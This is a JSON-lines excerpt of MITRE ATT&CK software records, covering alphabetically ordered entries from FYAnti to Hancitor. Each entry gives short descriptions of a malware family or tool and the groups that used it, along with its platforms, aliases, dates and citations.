{"ID":"S0628","name":"FYAnti","description":"[FYAnti](https://attack.mitre.org/software/S0628) is a loader that has been used by [menuPass](https://attack.mitre.org/groups/G0045) since at least 2020, including to deploy [QuasarRAT](https://attack.mitre.org/software/S0262).(Citation: Securelist APT10 March 2021)","url":"https://attack.mitre.org/software/S0628","created":"22 June 2021","last modified":"11 October 2021","version":"1.0","contributors":null,"platforms":"Windows","aliases":"DILLJUICE stage2","type":"malware","relationship citations":"(Citation: Securelist APT10 March 2021),,(Citation: Securelist APT10 March 2021)"}
{"ID":"S0076","name":"FakeM","description":"[FakeM](https://attack.mitre.org/software/S0076) is a shellcode-based Windows backdoor that has been used by [Scarlet Mimic](https://attack.mitre.org/groups/G0029). (Citation: Scarlet Mimic Jan 2016)","url":"https://attack.mitre.org/software/S0076","created":"31 May 2017","last modified":"27 March 2020","version":"1.1","contributors":null,"platforms":"Windows","aliases":null,"type":"malware","relationship citations":"(Citation: Scarlet Mimic Jan 2016),,(Citation: Scarlet Mimic Jan 2016)"}
{"ID":"S0512","name":"FatDuke","description":"[FatDuke](https://attack.mitre.org/software/S0512) is a backdoor used by [APT29](https://attack.mitre.org/groups/G0016) since at least 2016.(Citation: ESET Dukes October 2019)","url":"https://attack.mitre.org/software/S0512","created":"24 September 2020","last modified":"16 October 2021","version":"1.1","contributors":null,"platforms":"Windows","aliases":null,"type":"malware","relationship citations":"(Citation: Secureworks IRON HEMLOCK Profile),(Citation: ESET Dukes October 2019),(Citation: ESET Dukes October 2019),(Citation: ESET Dukes October 2019)"}
{"ID":"S0171","name":"Felismus","description":"[Felismus](https://attack.mitre.org/software/S0171) is a modular backdoor that has been used by [Sowbug](https://attack.mitre.org/groups/G0054). (Citation: Symantec Sowbug Nov 2017) (Citation: Forcepoint Felismus Mar 2017)","url":"https://attack.mitre.org/software/S0171","created":"16 January 2018","last modified":"30 March 2020","version":"1.1","contributors":null,"platforms":"Windows","aliases":null,"type":"malware","relationship citations":"(Citation: Symantec Sowbug Nov 2017),,(Citation: Forcepoint Felismus Mar 2017)"}
{"ID":"S0679","name":"Ferocious","description":"[Ferocious](https://attack.mitre.org/software/S0679) is a first stage implant composed of VBS and PowerShell scripts that has been used by [WIRTE](https://attack.mitre.org/groups/G0090) since at least 2021.(Citation: Kaspersky WIRTE November 2021)","url":"https://attack.mitre.org/software/S0679","created":"01 February 2022","last modified":"01 February 2022","version":"1.0","contributors":null,"platforms":"Windows","aliases":null,"type":"malware","relationship citations":"(Citation: Kaspersky WIRTE November 2021),,(Citation: Kaspersky WIRTE November 2021)"}
{"ID":"S0120","name":"Fgdump","description":"[Fgdump](https://attack.mitre.org/software/S0120) is a Windows password hash dumper. (Citation: Mandiant APT1)","url":"https://attack.mitre.org/software/S0120","created":"31 May 2017","last modified":"30 March 2020","version":"1.1","contributors":null,"platforms":"Windows","aliases":null,"type":"tool","relationship citations":",,(Citation: Mandiant APT1)"}
{"ID":"S0182","name":"FinFisher","description":"[FinFisher](https://attack.mitre.org/software/S0182) is a government-grade commercial surveillance spyware reportedly sold exclusively to government agencies for use in targeted and lawful criminal investigations. It is heavily obfuscated and uses multiple anti-analysis techniques. It has other variants including [Wingbird](https://attack.mitre.org/software/S0176). (Citation: FinFisher Citation) (Citation: Microsoft SIR Vol 21) (Citation: FireEye FinSpy Sept 2017) (Citation: Securelist BlackOasis Oct 2017) (Citation: Microsoft FinFisher March 2018)","url":"https://attack.mitre.org/software/S0182","created":"16 January 2018","last modified":"02 March 2022","version":"1.4","contributors":null,"platforms":"Android, Windows","aliases":"FinSpy","type":"malware","relationship citations":"(Citation: Lookout Dark Caracal Jan 2018),,(Citation: Microsoft FinFisher March 2018),(Citation: Elastic Process Injection July 2017),(Citation: FinFisher exposed ),(Citation: FinFisher Citation),(Citation: Securelist BlackOasis Oct 2017)"}
{"ID":"S0355","name":"Final1stspy","description":"[Final1stspy](https://attack.mitre.org/software/S0355) is a dropper family that has been used to deliver [DOGCALL](https://attack.mitre.org/software/S0213).(Citation: Unit 42 Nokki Oct 2018)","url":"https://attack.mitre.org/software/S0355","created":"31 January 2019","last modified":"30 March 2020","version":"1.1","contributors":null,"platforms":"Windows","aliases":null,"type":"malware","relationship citations":"(Citation: Unit 42 Nokki Oct 2018),,(Citation: Unit 42 Nokki Oct 2018)"}
{"ID":"S0696","name":"Flagpro","description":"[Flagpro](https://attack.mitre.org/software/S0696) is a Windows-based, first-stage downloader that has been used by [BlackTech](https://attack.mitre.org/groups/G0098) since at least October 2020. It has primarily been used against defense, media, and communications companies in Japan.(Citation: NTT Security Flagpro new December 2021) ","url":"https://attack.mitre.org/software/S0696","created":"25 March 2022","last modified":"01 April 2022","version":"1.0","contributors":"Hannah Simes, BT Security","platforms":"Windows","aliases":null,"type":"malware","relationship citations":"(Citation: NTT Security Flagpro new December 2021),,(Citation: NTT Security Flagpro new December 2021)"}
{"ID":"S0143","name":"Flame","description":"[Flame](https://attack.mitre.org/software/S0143) is a sophisticated toolkit that has been used to collect information since at least 2010, largely targeting Middle East countries. (Citation: Kaspersky Flame)","url":"https://attack.mitre.org/software/S0143","created":"31 May 2017","last modified":"12 October 2022","version":"1.1","contributors":null,"platforms":"Windows","aliases":"Flamer, sKyWIper","type":"malware","relationship citations":",,(Citation: Kaspersky Flame Functionality),(Citation: Kaspersky Flame),(Citation: Crysys Skywiper),(Citation: Symantec Beetlejuice)"}
{"ID":"S0381","name":"FlawedAmmyy","description":"[FlawedAmmyy](https://attack.mitre.org/software/S0381) is a remote access tool (RAT) that was first seen in early 2016. The code for [FlawedAmmyy](https://attack.mitre.org/software/S0381) was based on leaked source code for a version of Ammyy Admin, a remote access software.(Citation: Proofpoint TA505 Mar 2018)","url":"https://attack.mitre.org/software/S0381","created":"28 May 2019","last modified":"18 July 2022","version":"1.2","contributors":null,"platforms":"Windows","aliases":null,"type":"malware","relationship citations":"(Citation: Visa FIN6 Feb 2019),(Citation: Proofpoint TA505 October 2019),(Citation: Trend Micro TA505 June 2019),(Citation: Proofpoint TA505 Mar 2018),,(Citation: Korean FSI TA505 2020),(Citation: Proofpoint TA505 Mar 2018)"}
{"ID":"S0383","name":"FlawedGrace","description":"[FlawedGrace](https://attack.mitre.org/software/S0383) is a fully featured remote access tool (RAT) written in C++ that was first observed in late 2017.(Citation: Proofpoint TA505 Jan 2019)","url":"https://attack.mitre.org/software/S0383","created":"29 May 2019","last modified":"07 June 2019","version":"1.0","contributors":null,"platforms":"Windows","aliases":null,"type":"malware","relationship citations":"(Citation: Proofpoint TA505 Jan 2019),(Citation: Proofpoint TA505 October 2019),(Citation: Trend Micro TA505 June 2019),,(Citation: Proofpoint TA505 Jan 2019)"}
{"ID":"S0661","name":"FoggyWeb","description":"[FoggyWeb](https://attack.mitre.org/software/S0661) is a passive and highly-targeted backdoor capable of remotely exfiltrating sensitive information from a compromised Active Directory Federated Services (AD FS) server. It has been used by [APT29](https://attack.mitre.org/groups/G0016) since at least early April 2021.(Citation: MSTIC FoggyWeb September 2021)","url":"https://attack.mitre.org/software/S0661","created":"16 November 2021","last modified":"15 April 2022","version":"1.0","contributors":"Craig Smith, BT Security","platforms":"Windows","aliases":null,"type":"malware","relationship citations":"(Citation: MSTIC FoggyWeb September 2021),,(Citation: MSTIC FoggyWeb September 2021)"}
{"ID":"S0193","name":"Forfiles","description":"[Forfiles](https://attack.mitre.org/software/S0193) is a Windows utility commonly used in batch jobs to execute commands on one or more selected files or directories (ex: list all directories in a drive, read the first line of all files created yesterday, etc.). Forfiles can be executed from either the command line, Run window, or batch files/scripts. (Citation: Microsoft Forfiles Aug 2016)","url":"https://attack.mitre.org/software/S0193","created":"18 April 2018","last modified":"17 October 2018","version":"1.0","contributors":null,"platforms":null,"aliases":null,"type":"tool","relationship citations":"(Citation: Überwachung APT28 Forfiles June 2015),,(Citation: VectorSec ForFiles Aug 2017),(Citation: Evi1cg Forfiles Nov 2017),(Citation: Überwachung APT28 Forfiles June 2015)"}
{"ID":"S0503","name":"FrameworkPOS","description":"[FrameworkPOS](https://attack.mitre.org/software/S0503) is a point of sale (POS) malware used by [FIN6](https://attack.mitre.org/groups/G0037) to steal payment card data from sytems that run physical POS devices.(Citation: SentinelOne FrameworkPOS September 2019)","url":"https://attack.mitre.org/software/S0503","created":"08 September 2020","last modified":"19 October 2020","version":"1.0","contributors":"Center for Threat-Informed Defense (CTID)","platforms":null,"aliases":"Trinity","type":"malware","relationship citations":"(Citation: Visa FIN6 Feb 2019),(Citation: SentinelOne FrameworkPOS September 2019),(Citation: Crowdstrike Global Threat Report Feb 2018),,(Citation: SentinelOne FrameworkPOS September 2019),(Citation: FireEye FIN6 April 2016)"}
{"ID":"S0277","name":"FruitFly","description":"FruitFly is designed to spy on mac users  (Citation: objsee mac malware 2017).","url":"https://attack.mitre.org/software/S0277","created":"17 October 2018","last modified":"22 March 2023","version":"1.2","contributors":null,"platforms":"macOS","aliases":null,"type":"malware","relationship citations":",,(Citation: objsee mac malware 2017)"}
{"ID":"S1044","name":"FunnyDream","description":"[FunnyDream](https://attack.mitre.org/software/S1044) is a backdoor with multiple components that was used during the [FunnyDream](https://attack.mitre.org/campaigns/C0007) campaign since at least 2019, primarily for execution and exfiltration.(Citation: Bitdefender FunnyDream Campaign November 2020)","url":"https://attack.mitre.org/software/S1044","created":"23 September 2022","last modified":"11 October 2022","version":"1.0","contributors":null,"platforms":"Windows","aliases":null,"type":"malware","relationship citations":",(Citation: Bitdefender FunnyDream Campaign November 2020),(Citation: Bitdefender FunnyDream Campaign November 2020),(Citation: Kaspersky APT Trends Q1 2020)"}
{"ID":"S0410","name":"Fysbis","description":"[Fysbis](https://attack.mitre.org/software/S0410) is a Linux-based backdoor used by [APT28](https://attack.mitre.org/groups/G0007) that dates back to at least 2014.(Citation: Fysbis Palo Alto Analysis)","url":"https://attack.mitre.org/software/S0410","created":"12 September 2019","last modified":"06 November 2020","version":"1.2","contributors":null,"platforms":"Linux","aliases":null,"type":"malware","relationship citations":"(Citation: Fysbis Palo Alto Analysis),,(Citation: Fysbis Palo Alto Analysis),(Citation: Fysbis Dr Web Analysis)"}
{"ID":"S0026","name":"GLOOXMAIL","description":"[GLOOXMAIL](https://attack.mitre.org/software/S0026) is malware used by [APT1](https://attack.mitre.org/groups/G0006) that mimics legitimate Jabber/XMPP traffic. (Citation: Mandiant APT1)","url":"https://attack.mitre.org/software/S0026","created":"31 May 2017","last modified":"30 March 2020","version":"1.1","contributors":null,"platforms":"Windows","aliases":"Trojan.GTALK","type":"malware","relationship citations":"(Citation: Mandiant APT1),,(Citation: Mandiant APT1),(Citation: CyberESI GTALK)"}
{"ID":"S0417","name":"GRIFFON","description":"[GRIFFON](https://attack.mitre.org/software/S0417) is a JavaScript backdoor used by [FIN7](https://attack.mitre.org/groups/G0046). (Citation: SecureList Griffon May 2019)","url":"https://attack.mitre.org/software/S0417","created":"11 October 2019","last modified":"23 June 2020","version":"1.1","contributors":null,"platforms":"Windows","aliases":null,"type":"malware","relationship citations":"(Citation: SecureList Griffon May 2019),(Citation: CrowdStrike Carbon Spider August 2021),(Citation: FBI Flash FIN7 USB),,(Citation: SecureList Griffon May 2019)"}
{"ID":"S0168","name":"Gazer","description":"[Gazer](https://attack.mitre.org/software/S0168) is a backdoor used by [Turla](https://attack.mitre.org/groups/G0010) since at least 2016. (Citation: ESET Gazer Aug 2017)","url":"https://attack.mitre.org/software/S0168","created":"16 January 2018","last modified":"04 December 2020","version":"1.2","contributors":"Bartosz Jerzman","platforms":"Windows","aliases":"WhiteBear","type":"malware","relationship citations":"(Citation: ESET Gazer Aug 2017),,(Citation: Securelist WhiteBear Aug 2017),(Citation: ESET Gazer Aug 2017)"}
{"ID":"S0666","name":"Gelsemium","description":"[Gelsemium](https://attack.mitre.org/software/S0666) is a modular malware comprised of a dropper (Gelsemine), a loader (Gelsenicine), and main (Gelsevirine) plug-ins written using the Microsoft Foundation Class (MFC) framework. [Gelsemium](https://attack.mitre.org/software/S0666) has been used by the Gelsemium group since at least 2014.(Citation: ESET Gelsemium June 2021)","url":"https://attack.mitre.org/software/S0666","created":"30 November 2021","last modified":"26 March 2023","version":"1.1","contributors":null,"platforms":"Windows","aliases":"Gelsemine, Gelsenicine, Gelsevirine","type":"malware","relationship citations":",,(Citation: ESET Gelsemium June 2021)"}
{"ID":"S0049","name":"GeminiDuke","description":"[GeminiDuke](https://attack.mitre.org/software/S0049) is malware that was used by [APT29](https://attack.mitre.org/groups/G0016) from 2009 to 2012. (Citation: F-Secure The Dukes)","url":"https://attack.mitre.org/software/S0049","created":"31 May 2017","last modified":"30 March 2020","version":"1.1","contributors":null,"platforms":"Windows","aliases":null,"type":"malware","relationship citations":"(Citation: F-Secure The Dukes),,(Citation: F-Secure The Dukes)"}
{"ID":"S0460","name":"Get2","description":"[Get2](https://attack.mitre.org/software/S0460) is a downloader written in C++ that has been used by [TA505](https://attack.mitre.org/groups/G0092) to deliver [FlawedGrace](https://attack.mitre.org/software/S0383), [FlawedAmmyy](https://attack.mitre.org/software/S0381), Snatch and [SDBbot](https://attack.mitre.org/software/S0461).(Citation: Proofpoint TA505 October 2019)","url":"https://attack.mitre.org/software/S0460","created":"29 May 2020","last modified":"16 June 2020","version":"1.0","contributors":null,"platforms":"Windows","aliases":null,"type":"malware","relationship citations":"(Citation: Proofpoint TA505 October 2019),,(Citation: Proofpoint TA505 October 2019)"}
{"ID":"S0249","name":"Gold Dragon","description":"[Gold Dragon](https://attack.mitre.org/software/S0249) is a Korean-language, data gathering implant that was first observed in the wild in South Korea in July 2017. [Gold Dragon](https://attack.mitre.org/software/S0249) was used along with [Brave Prince](https://attack.mitre.org/software/S0252) and [RunningRAT](https://attack.mitre.org/software/S0253) in operations targeting organizations associated with the 2018 Pyeongchang Winter Olympics. (Citation: McAfee Gold Dragon)","url":"https://attack.mitre.org/software/S0249","created":"17 October 2018","last modified":"11 April 2022","version":"1.2","contributors":null,"platforms":"Windows","aliases":null,"type":"malware","relationship citations":"(Citation: Talos Kimsuky Nov 2021),,(Citation: McAfee Gold Dragon)"}
{"ID":"S0597","name":"GoldFinder","description":"[GoldFinder](https://attack.mitre.org/software/S0597) is a custom HTTP tracer tool written in Go that logs the route a packet takes between a compromised network and a C2 server. It can be used to inform  threat actors of potential points of discovery or logging of their actions, including C2 related to other malware. [GoldFinder](https://attack.mitre.org/software/S0597) was discovered in early 2021 during an investigation into the [SolarWinds Compromise](https://attack.mitre.org/campaigns/C0024) by [APT29](https://attack.mitre.org/groups/G0016).(Citation: MSTIC NOBELIUM Mar 2021)","url":"https://attack.mitre.org/software/S0597","created":"26 March 2021","last modified":"27 March 2023","version":"1.1","contributors":null,"platforms":"Windows","aliases":null,"type":"malware","relationship citations":"(Citation: Secureworks IRON RITUAL Profile),(Citation: MSTIC Nobelium Toolset May 2021),(Citation: MSTIC NOBELIUM Mar 2021),(Citation: Cybersecurity Advisory SVR TTP May 2021),(Citation: MSTIC NOBELIUM Mar 2021),(Citation: MSTIC NOBELIUM Mar 2021)"}
{"ID":"S0588","name":"GoldMax","description":"[GoldMax](https://attack.mitre.org/software/S0588) is a second-stage C2 backdoor written in Go with Windows and Linux variants that are nearly identical in functionality. [GoldMax](https://attack.mitre.org/software/S0588) was discovered in early 2021 during the investigation into the [SolarWinds Compromise](https://attack.mitre.org/campaigns/C0024), and has likely been used by [APT29](https://attack.mitre.org/groups/G0016) since at least mid-2019. [GoldMax](https://attack.mitre.org/software/S0588) uses multiple defense evasion techniques, including avoiding virtualization execution and masking malicious traffic.(Citation: MSTIC NOBELIUM Mar 2021)(Citation: FireEye SUNSHUTTLE Mar 2021)(Citation: CrowdStrike StellarParticle January 2022)","url":"https://attack.mitre.org/software/S0588","created":"12 March 2021","last modified":"27 March 2023","version":"2.1","contributors":null,"platforms":"Linux, Windows","aliases":"SUNSHUTTLE","type":"malware","relationship citations":"(Citation: MSTIC NOBELIUM May 2021),(Citation: MSTIC Nobelium Toolset May 2021),(Citation: Cybersecurity Advisory SVR TTP May 2021),(Citation: Secureworks IRON RITUAL Profile),(Citation: MSTIC NOBELIUM Mar 2021),(Citation: MSTIC NOBELIUM Mar 2021),(Citation: FireEye SUNSHUTTLE Mar 2021),(Citation: CrowdStrike StellarParticle January 2022),(Citation: MSTIC NOBELIUM Mar 2021)"}
{"ID":"S0493","name":"GoldenSpy","description":"[GoldenSpy](https://attack.mitre.org/software/S0493) is a backdoor malware which has been packaged with legitimate tax preparation software. [GoldenSpy](https://attack.mitre.org/software/S0493) was discovered targeting organizations in China, being delivered with the \"Intelligent Tax\" software suite which is produced by the Golden Tax Department of Aisino Credit Information Co. and required to pay local taxes.(Citation: Trustwave GoldenSpy June 2020) ","url":"https://attack.mitre.org/software/S0493","created":"23 July 2020","last modified":"19 August 2020","version":"1.0","contributors":null,"platforms":"Windows","aliases":null,"type":"malware","relationship citations":",,(Citation: Trustwave GoldenSpy2 June 2020),(Citation: Trustwave GoldenSpy June 2020)"}
{"ID":"S0477","name":"Goopy","description":"[Goopy](https://attack.mitre.org/software/S0477) is a Windows backdoor and Trojan used by [APT32](https://attack.mitre.org/groups/G0050) and shares several similarities to another backdoor used by the group ([Denis](https://attack.mitre.org/software/S0354)). [Goopy](https://attack.mitre.org/software/S0477) is named for its impersonation of the legitimate Google Updater executable.(Citation: Cybereason Cobalt Kitty 2017)","url":"https://attack.mitre.org/software/S0477","created":"19 June 2020","last modified":"11 July 2022","version":"1.1","contributors":null,"platforms":"Windows","aliases":null,"type":"malware","relationship citations":"(Citation: Cybereason Cobalt Kitty 2017),,(Citation: Cybereason Cobalt Kitty 2017)"}
{"ID":"S0531","name":"Grandoreiro","description":"[Grandoreiro](https://attack.mitre.org/software/S0531) is a banking trojan written in Delphi that was first observed in 2016 and uses a Malware-as-a-Service (MaaS) business model. [Grandoreiro](https://attack.mitre.org/software/S0531) has confirmed victims in Brazil, Mexico, Portugal, and Spain.(Citation: Securelist Brazilian Banking Malware July 2020)(Citation: ESET Grandoreiro April 2020)","url":"https://attack.mitre.org/software/S0531","created":"10 November 2020","last modified":"26 March 2023","version":"1.1","contributors":null,"platforms":"Windows","aliases":null,"type":"malware","relationship citations":",,(Citation: IBM Grandoreiro April 2020),(Citation: Securelist Brazilian Banking Malware July 2020),(Citation: ESET Grandoreiro April 2020)"}
{"ID":"S0237","name":"GravityRAT","description":"[GravityRAT](https://attack.mitre.org/software/S0237) is a remote access tool (RAT) and has been in ongoing development since 2016. The actor behind the tool remains unknown, but two usernames have been recovered that link to the author, which are \"TheMartian\" and \"The Invincible.\" According to the National Computer Emergency Response Team (CERT) of India, the malware has been identified in attacks against organization and entities in India. (Citation: Talos GravityRAT)","url":"https://attack.mitre.org/software/S0237","created":"17 October 2018","last modified":"30 March 2020","version":"1.2","contributors":null,"platforms":"Windows","aliases":null,"type":"malware","relationship citations":",,(Citation: Talos GravityRAT)"}
{"ID":"S0690","name":"Green Lambert","description":"[Green Lambert](https://attack.mitre.org/software/S0690) is a modular backdoor that security researchers assess has been used by an advanced threat group referred to as Longhorn and The Lamberts. First reported in 2017, the Windows variant of [Green Lambert](https://attack.mitre.org/software/S0690) may have been used as early as 2008; a macOS version was uploaded to a multiscanner service in September 2014.(Citation: Kaspersky Lamberts Toolkit April 2017)(Citation: Objective See Green Lambert for OSX Oct 2021)  ","url":"https://attack.mitre.org/software/S0690","created":"21 March 2022","last modified":"20 April 2022","version":"1.0","contributors":"Runa Sandvik","platforms":"Linux, Windows, iOS, macOS","aliases":null,"type":"malware","relationship citations":",,(Citation: Glitch-Cat Green Lambert ATTCK Oct 2021),(Citation: Objective See Green Lambert for OSX Oct 2021)"}
{"ID":"S0342","name":"GreyEnergy","description":"[GreyEnergy](https://attack.mitre.org/software/S0342) is a backdoor written in C and compiled in Visual Studio. [GreyEnergy](https://attack.mitre.org/software/S0342) shares similarities with the [BlackEnergy](https://attack.mitre.org/software/S0089) malware and is thought to be the successor of it.(Citation: ESET GreyEnergy Oct 2018)","url":"https://attack.mitre.org/software/S0342","created":"30 January 2019","last modified":"30 March 2020","version":"1.1","contributors":null,"platforms":"Windows","aliases":null,"type":"malware","relationship citations":"(Citation: Secureworks IRON VIKING ),,(Citation: ESET GreyEnergy Oct 2018)"}
{"ID":"S0632","name":"GrimAgent","description":"[GrimAgent](https://attack.mitre.org/software/S0632) is a backdoor that has been used before the deployment of [Ryuk](https://attack.mitre.org/software/S0446) ransomware since at least 2020; it is likely used by [FIN6](https://attack.mitre.org/groups/G0037) and [Wizard Spider](https://attack.mitre.org/groups/G0102).(Citation: Group IB GrimAgent July 2021)","url":"https://attack.mitre.org/software/S0632","created":"16 July 2021","last modified":"29 July 2022","version":"1.1","contributors":null,"platforms":"Windows","aliases":null,"type":"malware","relationship citations":"(Citation: Group IB GrimAgent July 2021),,(Citation: Group IB GrimAgent July 2021)"}
{"ID":"S0561","name":"GuLoader","description":"[GuLoader](https://attack.mitre.org/software/S0561) is a file downloader that has been used since at least December 2019 to distribute a variety of remote administration tool (RAT) malware, including [NETWIRE](https://attack.mitre.org/software/S0198), [Agent Tesla](https://attack.mitre.org/software/S0331), [NanoCore](https://attack.mitre.org/software/S0336), FormBook, and Parallax RAT.(Citation: Unit 42 NETWIRE April 2020)(Citation: Medium Eli Salem GuLoader April 2021)","url":"https://attack.mitre.org/software/S0561","created":"11 January 2021","last modified":"15 October 2021","version":"2.0","contributors":"Eli Salem, @elisalem9","platforms":"Windows","aliases":null,"type":"malware","relationship citations":",,(Citation: Medium Eli Salem GuLoader April 2021),(Citation: Unit 42 NETWIRE April 2020)"}
{"ID":"S0132","name":"H1N1","description":"[H1N1](https://attack.mitre.org/software/S0132) is a malware variant that has been distributed via a campaign using VBA macros to infect victims. Although it initially had only loader capabilities, it has evolved to include information-stealing functionality. (Citation: Cisco H1N1 Part 1)","url":"https://attack.mitre.org/software/S0132","created":"31 May 2017","last modified":"30 March 2020","version":"1.2","contributors":null,"platforms":"Windows","aliases":null,"type":"malware","relationship citations":",,(Citation: Cisco H1N1 Part 1),(Citation: Cisco H1N1 Part 2)"}
{"ID":"S0151","name":"HALFBAKED","description":"[HALFBAKED](https://attack.mitre.org/software/S0151) is a malware family consisting of multiple components intended to establish persistence in victim networks. (Citation: FireEye FIN7 April 2017)","url":"https://attack.mitre.org/software/S0151","created":"14 December 2017","last modified":"17 October 2018","version":"1.0","contributors":null,"platforms":null,"aliases":null,"type":"malware","relationship citations":"(Citation: FireEye FIN7 Aug 2018),(Citation: FireEye FIN7 April 2017),,(Citation: FireEye FIN7 April 2017)"}
{"ID":"S0037","name":"HAMMERTOSS","description":"[HAMMERTOSS](https://attack.mitre.org/software/S0037) is a backdoor that was used by [APT29](https://attack.mitre.org/groups/G0016) in 2015. (Citation: FireEye APT29) (Citation: F-Secure The Dukes)","url":"https://attack.mitre.org/software/S0037","created":"31 May 2017","last modified":"09 February 2021","version":"1.2","contributors":null,"platforms":"Windows","aliases":"HammerDuke, NetDuke","type":"malware","relationship citations":"(Citation: Secureworks IRON HEMLOCK Profile),(Citation: F-Secure The Dukes),,(Citation: FireEye APT29)"}
{"ID":"S0214","name":"HAPPYWORK","description":"[HAPPYWORK](https://attack.mitre.org/software/S0214) is a downloader used by [APT37](https://attack.mitre.org/groups/G0067) to target South Korean government and financial victims in November 2016. (Citation: FireEye APT37 Feb 2018)","url":"https://attack.mitre.org/software/S0214","created":"18 April 2018","last modified":"17 October 2018","version":"1.0","contributors":null,"platforms":null,"aliases":null,"type":"malware","relationship citations":"(Citation: FireEye APT37 Feb 2018),,(Citation: FireEye APT37 Feb 2018)"}
{"ID":"S0246","name":"HARDRAIN","description":"[HARDRAIN](https://attack.mitre.org/software/S0246) is a Trojan malware variant reportedly used by the North Korean government. (Citation: US-CERT HARDRAIN March 2018)","url":"https://attack.mitre.org/software/S0246","created":"17 October 2018","last modified":"30 March 2020","version":"1.1","contributors":null,"platforms":"Windows","aliases":null,"type":"malware","relationship citations":"(Citation: US-CERT HARDRAIN March 2018),,(Citation: US-CERT HARDRAIN March 2018)"}
{"ID":"S0391","name":"HAWKBALL","description":"[HAWKBALL](https://attack.mitre.org/software/S0391) is a backdoor that was observed in targeting of the government sector in Central Asia.(Citation: FireEye HAWKBALL Jun 2019)","url":"https://attack.mitre.org/software/S0391","created":"20 June 2019","last modified":"30 March 2020","version":"1.1","contributors":null,"platforms":"Windows","aliases":null,"type":"malware","relationship citations":",,(Citation: FireEye HAWKBALL Jun 2019)"}
{"ID":"S0061","name":"HDoor","description":"[HDoor](https://attack.mitre.org/software/S0061) is malware that has been customized and used by the [Naikon](https://attack.mitre.org/groups/G0019) group. (Citation: Baumgartner Naikon 2015)","url":"https://attack.mitre.org/software/S0061","created":"31 May 2017","last modified":"04 April 2023","version":"1.0","contributors":null,"platforms":"Windows","aliases":"Custom HDoor","type":"malware","relationship citations":"(Citation: Baumgartner Naikon 2015),,(Citation: Baumgartner Naikon 2015)"}
{"ID":"S0617","name":"HELLOKITTY","description":"[HELLOKITTY](https://attack.mitre.org/software/S0617) is a ransomware written in C++  that shares similar code structure and functionality with [DEATHRANSOM](https://attack.mitre.org/software/S0616) and [FIVEHANDS](https://attack.mitre.org/software/S0618). [HELLOKITTY](https://attack.mitre.org/software/S0617) has been used since at least 2020, targets have included a Polish video game developer and a Brazilian electric power company.(Citation: FireEye FiveHands April 2021)","url":"https://attack.mitre.org/software/S0617","created":"03 June 2021","last modified":"18 October 2021","version":"1.0","contributors":null,"platforms":"Windows","aliases":null,"type":"malware","relationship citations":",,(Citation: FireEye FiveHands April 2021)"}
{"ID":"S0135","name":"HIDEDRV","description":"[HIDEDRV](https://attack.mitre.org/software/S0135) is a rootkit used by [APT28](https://attack.mitre.org/groups/G0007). It has been deployed along with [Downdelph](https://attack.mitre.org/software/S0134) to execute and hide that malware. (Citation: ESET Sednit Part 3) (Citation: Sekoia HideDRV Oct 2016)","url":"https://attack.mitre.org/software/S0135","created":"31 May 2017","last modified":"30 March 2020","version":"1.1","contributors":null,"platforms":"Windows","aliases":null,"type":"malware","relationship citations":"(Citation: ESET Sednit Part 3),,(Citation: ESET Sednit Part 3)"}
{"ID":"S0232","name":"HOMEFRY","description":"[HOMEFRY](https://attack.mitre.org/software/S0232) is a 64-bit Windows password dumper/cracker that has previously been used in conjunction with other [Leviathan](https://attack.mitre.org/groups/G0065) backdoors. (Citation: FireEye Periscope March 2018)","url":"https://attack.mitre.org/software/S0232","created":"18 April 2018","last modified":"30 March 2020","version":"1.1","contributors":null,"platforms":"Windows","aliases":null,"type":"malware","relationship citations":"(Citation: FireEye Periscope March 2018),,(Citation: FireEye Periscope March 2018)"}
{"ID":"S0376","name":"HOPLIGHT","description":"[HOPLIGHT](https://attack.mitre.org/software/S0376) is a backdoor Trojan that has reportedly been used by the North Korean government.(Citation: US-CERT HOPLIGHT Apr 2019)","url":"https://attack.mitre.org/software/S0376","created":"19 April 2019","last modified":"28 March 2023","version":"1.2","contributors":null,"platforms":"Windows","aliases":null,"type":"malware","relationship citations":"(Citation: US-CERT HOPLIGHT Apr 2019),(Citation: CISA AA20-239A BeagleBoyz August 2020),,(Citation: US-CERT HOPLIGHT Apr 2019)"}
{"ID":"S0040","name":"HTRAN","description":"[HTRAN](https://attack.mitre.org/software/S0040) is a tool that proxies connections through intermediate hops and aids users in disguising their true geographical location. It can be used by adversaries to hide their location when interacting with the victim networks. (Citation: Operation Quantum Entanglement)(Citation: NCSC Joint Report Public Tools)","url":"https://attack.mitre.org/software/S0040","created":"31 May 2017","last modified":"23 April 2021","version":"1.2","contributors":null,"platforms":"Linux, Windows","aliases":"HUC Packet Transmit Tool","type":"tool","relationship citations":"(Citation: Trend Micro IXESHE 2012),(Citation: Cybereason Soft Cell June 2019),(Citation: Microsoft GALLIUM December 2019),,(Citation: NCSC Joint Report Public Tools),(Citation: Operation Quantum Entanglement)"}
{"ID":"S0070","name":"HTTPBrowser","description":"[HTTPBrowser](https://attack.mitre.org/software/S0070) is malware that has been used by several threat groups. (Citation: ThreatStream Evasion Analysis) (Citation: Dell TG-3390) It is believed to be of Chinese origin. (Citation: ThreatConnect Anthem)","url":"https://attack.mitre.org/software/S0070","created":"31 May 2017","last modified":"20 March 2020","version":"1.1","contributors":null,"platforms":"Windows","aliases":"HttpDump, Token Control","type":"malware","relationship citations":"(Citation: SecureWorks BRONZE UNION June 2017),(Citation: RSA2017 Detect and Respond Adair),(Citation: Nccgroup Emissary Panda May 2018),(Citation: Trend Micro Iron Tiger April 2021),(Citation: Dell TG-3390),,(Citation: ThreatStream Evasion Analysis),(Citation: ZScaler Hacking Team),(Citation: Dell TG-3390)"}
{"ID":"S0047","name":"Hacking Team UEFI Rootkit","description":"[Hacking Team UEFI Rootkit](https://attack.mitre.org/software/S0047) is a rootkit developed by the company Hacking Team as a method of persistence for remote access software. (Citation: TrendMicro Hacking Team UEFI)","url":"https://attack.mitre.org/software/S0047","created":"31 May 2017","last modified":"30 March 2020","version":"1.1","contributors":null,"platforms":null,"aliases":null,"type":"malware","relationship citations":",,(Citation: TrendMicro Hacking Team UEFI)"}
{"ID":"S0499","name":"Hancitor","description":"[Hancitor](https://attack.mitre.org/software/S0499) is a downloader that has been used by [Pony](https://attack.mitre.org/software/S0453) and other information stealing malware.(Citation: Threatpost Hancitor)(Citation: FireEye Hancitor)","url":"https://attack.mitre.org/software/S0499","created":"12 August 2020","last modified":"16 October 2020","version":"1.0","contributors":null,"platforms":"Windows","aliases":"Chanitor","type":"malware","relationship citations":",,(Citation: FireEye Hancitor),(Citation: Red Canary Verclsid.exe),(Citation: Threatpost Hancitor)"}
